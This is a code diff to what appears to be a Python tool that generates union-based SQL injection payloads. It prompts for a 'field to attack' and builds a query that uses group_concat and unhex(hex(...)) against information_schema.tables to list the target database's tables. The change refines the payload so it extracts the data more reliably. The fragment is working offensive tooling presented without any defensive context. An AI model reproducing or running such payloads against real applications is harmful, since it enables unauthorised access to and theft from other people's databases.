@@ -14,11 +14,11 @@ while i <= text:
     else:
         amount = amount + str(i)
     i +=1
-selectStatement = "union all select "+ amount
+selectStatement = "union all select "+ amount + "--"
 print(selectStatement)
 encode(selectStatement)
 numberToAttack = input("Field to attack > ")
-selectStatement = selectStatement.replace(","+str(numberToAttack)+",",",group_concat(table_name),")
+selectStatement = selectStatement.replace(","+str(numberToAttack)+",",",unhex(hex(group_concat(table_name))),")
 selectStatement = selectStatement.replace ("--","")
 selectStatement = selectStatement + " from information_schema.tables where table_schema=database()--"
 print(selectStatement)
